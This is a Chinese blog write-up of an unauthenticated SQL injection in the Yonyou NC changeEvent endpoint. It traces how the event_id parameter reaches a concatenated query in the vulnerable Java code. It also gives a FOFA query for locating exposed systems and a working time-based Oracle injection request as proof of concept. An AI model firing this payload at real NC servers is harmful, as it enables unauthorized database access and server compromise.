---
title: "用友NC changeEvent SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-changeEvent-sqli.html
asset_dir: assets/用友nc-changeevent-sql注入漏洞
---

# 用友NC changeEvent SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/6/16 08:23
* 1371浏览
* [0评论](#comment)
* 57分钟阅读

深入探索

数据库管理系统

软件

数据库


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/用友) NC 是一种商业级的[企业资源规划](#)，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。⽤友NC `oacoSchedulerEvents/changeEvent` 接⼝处存在[SQL注入漏洞](https://mrxn.net/tag/SQL注入)，未授权的攻击者可以通过此漏洞获取数据库权限，进 ⼀步利⽤可导致服务器失陷。

SQL注入检测工具

# 影响版本

NC65

# fofa语法

> `icon_hash="1085941792" || app="用友-UFIDA-NC"`

# 漏洞分析

`SchedulerEventsAction` 此前出现过 `listUserSharingEvents` sql注入漏洞，详情可以看这篇[用友NC listUserSharingEvents SQL注入漏洞](https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-agent-sqli.html) ，而此次出现漏洞的方法变成了 `changeEvent`，先看下其实现逻辑吧

深入探索

企业资源计划

安全研究工具

计算机安全

```
public void changeEvent() throws BusinessException, IOException {
        ISchedulerQueryService schedulerQueryService = (ISchedulerQueryService)NCLocator.getInstance().lookup(ISchedulerQueryService.class);
        ISchedulerManageService schedulerManageService = (ISchedulerManageService)NCLocator.getInstance().lookup(ISchedulerManageService.class);
        String pk_event = SchedulerUtils.encodeURI(this.getRequest().getParameter("event_id"));
        String startDate = SchedulerUtils.encodeURI(this.getRequest().getParameter("startDate"));
        String startDateOld = SchedulerUtils.encodeURI(this.getRequest().getParameter("startDate_old"));
        String endDate = SchedulerUtils.encodeURI(this.getRequest().getParameter("endDate"));
        String text = SchedulerUtils.encodeURI(this.getRequest().getParameter("text"));
        String event_ts = SchedulerUtils.encodeURI(this.getRequest().getParameter("event_ts"));
        String oper_type = SchedulerUtils.encodeURI(this.getRequest().getParameter("oper_type"));
        String event_type = SchedulerUtils.encodeURI(this.getRequest().getParameter("eventtype"));
        String source_id = SchedulerUtils.encodeURI(this.getRequest().getParameter("sourceid"));
        SchedulerEventJudger judger = new SchedulerEventJudger(schedulerQueryService);
        judger.getClass();
        SchedulerEventJudger.JudgedEvent judgerEvent = new SchedulerEventJudger.JudgedEvent(judger);
        judgerEvent.setPk_event(pk_event);
        judgerEvent.setStartDate(new UFDateTime(startDate));
        UFDateTime startDateOldDt = null;

        try {
            startDateOldDt = new UFDateTime(startDateOld);
        } catch (Exception var19) {
            startDateOldDt = judgerEvent.getStartDate();
        }

        judgerEvent.setStartDateOld(startDateOldDt);
        if (!StringUtils.isEmpty(event_ts) && !event_ts.equals("undefined")) {
            judgerEvent.setEvent_ts(new UFDateTime(event_ts));
        } else {
            judgerEvent.setEvent_ts(new UFDateTime());
        }

        judgerEvent.setEventLength(String.valueOf(startDateOldDt.getMillis() / 1000L));
        VersionStateEnum judgerState = judger.judgeCompatibleEvent(judgerEvent);
```

深入探索

SQL

dbms

sql

`pid_event` 被带入 `judgeCompatibleEvent` 方法中，看下其逻辑如何实现

代码安全审计

```
public VersionStateEnum judgeCompatibleEvent(JudgedEvent judgedEvent) {
        if (judgedEvent == null) {
            return VersionStateEnum.EXCEPTION;
        } else {
            if (this.schedulerQueryService == null) {
                this.schedulerQueryService = (ISchedulerQueryService)NCLocator.getInstance().lookup(ISchedulerQueryService.class);
            }

            try {
                String eid = judgedEvent.getPk_event();
                if (eid.indexOf(35) > -1) {
                    String pid_event = eid.substring(0, eid.indexOf(35));
                    SQLParameter param = null;
                    SchedulerEventVO[] children = this.schedulerQueryService.getSchedulerEvents("pid_event='" + pid_event + "' and eventlength=" + judgedEvent.getEventLength(), param, true);
                    return children != null && children.length != 0 ? VersionStateEnum.NOT_LASTED : VersionStateEnum.LASTED;
                } else {
                    SchedulerEventVO eventvo = this.schedulerQueryService.getSchedulerEvent(eid);
                    if (eventvo == null) {
                        return VersionStateEnum.NOT_EXIST;
                    } else {
```

再看下 `getSchedulerEvents` 部分的sql语句处理如下

漏洞扫描服务

```
public SchedulerEventVO[] getScheduleEvents(String sql, SQLParameter param, boolean isWhere) throws DAOException {
        StringBuilder sqlSB = new StringBuilder();
        if (isWhere) {
            sqlSB.append("select ").append("alertrule,alertstarttime,alerttype,eventlength,eventstate,eventtype,isfullday,isrecurevent,pid_event,pk_event,pk_user,priority,recurenddate,recurrule,recurstartdate,sourceid,sourceuri,title,ts,recurtag,modifiedtime,modifier,creationtime,creator,dr,proxy,sourcetitle,sharescope").append(" from oaco_schedulerevent");
            sqlSB.append(" where ").append(sql);
        } else {
            sqlSB.append(sql);
        }

        return param == null ? (SchedulerEventVO[])super.executeQueryVOs(sqlSB.toString(), SchedulerEventVO.class) : (SchedulerEventVO[])super.executeQueryVOs(sqlSB.toString(), param, SchedulerEventVO.class);
    }
```

那么整体上 `judgeCompatibleEvent` 方法中的 SQL 查询拼接前面用户可控的参数 `pid_event`

* `pid_event` 来自 `judgedEvent.getPk_event()`（即用户请求中的 `event_id` 参数），通过 `substring` 截取 `#` 前的部分。
* `judgedEvent.getEventLength()` 的值由用户控制的 `startDateOld` 参数计算得出（`startDateOldDt.getMillis() / 1000L`）。

而 `judgeCompatibleEvent` 方法中的 else 分支处理部分 `SchedulerEventVO eventvo = this.schedulerQueryService.getSchedulerEvent(eid);` 最终是使用了预编译参数化查询，因此不存在[SQL注入漏洞](https://mrxn.net/tag/SQL注入)。

整体处理流程如下图所示

企业资源规划

## changeEvent 方法流程图

[![用友NC changeEvent SQL注入漏洞](images/img-001-e10e81606ba2.webp)](https://image.mrxn.net/e286b4b421d24ea5bd274812251bff05.webp)

## judgeCompatibleEvent 方法流程图

[![用友NC changeEvent SQL注入漏洞](images/img-002-179d44ad5b1d.webp)](https://image.mrxn.net/3985e604d25145b49753897d029fd736.webp)

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用需要条件

编程

1. 请求中需包含 `event_id` 参数（含 `#` 字符）。
2. 其他参数（如 `startDateOld`）需满足类型要求（可伪造合法值如 2025-05-07 12:12:12）。

```
POST /portal/pt/oacoSchedulerEvents/changeEvent?pageId=login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: nc65.mrxn.net

event_id=1'AND 1=dbms_pipe.receive_message('RDS',3)--+#+&startDate=2025-05-07 12:12:12&startDate_old=2025-05-06 12:12:12
```

[![用友NC changeEvent SQL注入漏洞](images/img-003-19d753b22568.webp)](https://image.mrxn.net/96e37e6aeb1b48998ac31c49af3359c7.webp)

成功延时 3 秒

漏洞扫描服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [4.1.changeEvent 方法流程图](#toc-4-1-)
* [4.2.judgeCompatibleEvent 方法流程图](#toc-4-2-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC changeEvent SQL注入漏洞](https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-changeEvent-sqli.html)  
文章链接：<https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-changeEvent-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-changeEvent-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAK7klEQVR4Aeyc23LcOAxE5+z//7PXGNSRqR5xJDuJZx6YMtzqRgNkCKp8ydb+d7vdPn4SH/Fn1kObeXli5pPP/PoKZx718oyhPkO9s7x6+uQ/wRrIZ936eJcT2AbyOe3blZhtfFar37xcBG7Atra6fug8NJoX9RWqwd4Le17eCmgdGrO+PBXQeThG6xKr9kqMddtARnE9v+4EHgYC37sFuXU4roe9bp03CDqvPkOY++A45xpi9p7p8Lxf9plx6D6wxyP/w0COTEv7vRP46wPxton+VZKrQ98auQjHevaB9sHX1yE9IrQne8/y+q6ifa76n/n++kCeLbZy5yfwxwOB/e1zSWg9b48c9nl16+WJ0HX6RoTOwR5Hz/gM7XMN2PPRe/Rs3VHup9ofD+SnC6+64xN4GIhTTzwu//wx/+Pj/jME9O0CbnyG9dC69dDcvHoitE8d9tz6I7TmKkL3tpd1clEd2i8/Q+sTj+oeBnJkWtrvncA2EOipw3PMrUH7nX7mzzh0vT5obj/Yc30idB5Q2tAemxAPszxw/+2Bdmh+1Z910PVwjPoLt4EUWfH6E/jPqX8Xz7YOfRvsCz/jZ+vYvzC90Guqw56rV20F7PPQvHIV0Nw6sXIVyUv7bqw3xFN8E3wYCPQtgMbcJ7QOjeahuTcidbmYvuT6ROj+yaF1+EI99hTVRfiqAZQfELh/TbGPCK1bAM2hMXX5M3wYyDPzyv37E9gGAvupujTsdW+H+eTQfnVRP3ReLsKxbv5PEPa9c0/yM4Tnfa7uEfZ9xrptIKO4nl93At8eCPR0vU2w5+r+laDzchFah0Z1Mft8fHzcfyOg/gztcYb2gP0e4Jjrty+0DxrV06d+Bb89kCtNl+fnJ/Af9HSd6gxh73NJ/XJon1zUN0N9ifrV4bi/+SPMHkeeIw2O14JjPXvA3gfPedWvN6RO4Y1i+0kdenrQ6B7hmMOxPqtTT4TjPtA6NM7qoPPwhen9Lv/pG+U60Huxj2g+EdoP3NYbcnuvP9vXkNwW9NSc7gyhfdbrSw7tg8bMWyean6G+EfWqQa8FjeZnCHufffTDcV5fIuz99tEnH3G9IeNpvMHzNhCnJro36CnDHs3P/OYT05956HXU0y+H9sEXWpNojTp0jVxMX+qzvD7ovtCoLloPnZePuA3EooWvPYHT77Lc3jjFelYXSxtDHfa3AZqbn6G9zEPXQWPmy6cGc0/5DODGZ8y4emKuA72ePvMiHOehdfjC9YZ4im+C0++ynK77hK8pwtdz5uWifaBr1KE5NKonQuftI0Lr6b/C7SHOamC/BjSHRutF+0DnoVFdhNatG3G9IZ7Sm+A2EKfkvmA+Rb2FsPdBc/tcRei66lk